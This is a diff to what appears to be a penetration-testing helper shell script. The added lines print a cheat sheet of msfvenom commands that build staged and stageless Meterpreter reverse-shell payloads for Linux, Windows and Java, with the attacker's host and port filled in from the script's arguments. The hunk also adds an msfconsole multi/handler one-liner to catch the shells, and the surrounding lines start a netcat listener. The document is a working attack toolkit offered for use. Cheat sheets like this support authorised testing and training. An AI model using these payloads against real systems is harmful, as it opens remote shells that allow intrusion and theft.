@@ -112,6 +112,41 @@ printf "msfvenom -p java/jsp_shell_reverse_tcp  LHOST=$1 LPORT=$2 exitfunc=threa
 
 printf ".-------------------------------.\n\n\n"
 
+
+#MSFVenom Quick Reference
+printf ".. MSFVenom Meterpreter Quick Reference ..\n.-------------------------------.\n"
+printf "!!! Remember to add bad characters and other parameters as needed !!! \n\n"
+
+printf "Common Stag${YELLOW}ed${NC} Meterpreter Reverse Shells\n.-------------------------------.\n"
+
+printf "msfvenom -p linux/${GREEN}x86${NC}/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -a ${GREEN}x86${NC} --platform linux exitfunc=thread -f [FORMAT_TYPE]\n\n"
+printf "msfvenom -p linux/${YELLOW}x64${NC}/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -a ${YELLOW}x64${NC} --platform linux exitfunc=thread -f [FORMAT_TYPE]\n\n"
+
+printf "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -a ${GREEN}x86${NC} --platform windows exitfunc=thread -f [FORMAT_TYPE]\n\n"
+printf "msfvenom -p windows/${YELLOW}x64${NC}/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -a ${YELLOW}x64${NC} --platform windows exitfunc=thread -f [FORMAT_TYPE]\n\n"
+
+printf "msfvenom -p java/jsp_meterpreter/reverse_tcp  LHOST=$1 LPORT=$2 exitfunc=thread -f war \n\n"
+
+printf ".-------------------------------.\n\n\n\n"
+
+printf "Common Stage${RED}less${NC} Meterpreter Reverse Shells\n.-------------------------------.\n"
+
+printf "msfvenom -p linux/${GREEN}x86${NC}/meterpreter_reverse_tcp LHOST=$1 LPORT=$2 -a ${GREEN}x86${NC} --platform linux exitfunc=thread -f [FORMAT_TYPE]\n\n"
+printf "msfvenom -p linux/${YELLOW}x64${NC}/meterpreter_reverse_tcp LHOST=$1 LPORT=$2 -a ${YELLOW}x64${NC} --platform linux exitfunc=thread -f [FORMAT_TYPE]\n\n"
+
+printf "msfvenom -p windows/meterpreter_reverse_tcp LHOST=$1 LPORT=$2 -a ${GREEN}x86${NC} --platform windows exitfunc=thread -f [FORMAT_TYPE]\n\n"
+printf "msfvenom -p windows/${YELLOW}x64${NC}/meterpreter_reverse_tcp LHOST=$1 LPORT=$2 -a ${YELLOW}x64${NC} --platform windows exitfunc=thread -f [FORMAT_TYPE]\n\n"
+
+printf "msfvenom -p java/jsp_meterpreter_reverse_tcp  LHOST=$1 LPORT=$2 exitfunc=thread -f war \n\n"
+
+printf ".-------------------------------.\n\n\n"
+
+
+printf ".. MSFConsole MultiHandler Quick Reference ..\n.-------------------------------.\n"
+
+
+printf "msfconsole -q -x \"use exploit/multi/handler; set LHOST $1; set LPORT $2; set payload windows/meterpreter/reverse_tcp; set exitfunc thread; run -j\"\n\n"
+
 unset conchofilename
 
 printf "${GREEN}Starting simple listener with 'nc -lnvp ${YELLOW}$2'\n${NC}"
